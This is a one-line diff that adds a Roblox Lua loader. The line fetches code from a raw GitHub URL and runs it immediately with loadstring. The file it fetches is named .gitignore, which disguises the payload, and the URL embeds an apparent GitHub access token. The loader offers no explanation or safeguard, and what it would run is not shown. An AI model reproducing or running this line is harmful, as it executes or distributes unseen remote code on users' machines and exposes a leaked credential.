@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2hwhcat/Morescrjipts/main/.gitignore?token=GHSAT0AAAAAAB3V2W5JIX3ZWJUIXLFHEBZ4Y5CDCAA",true))()
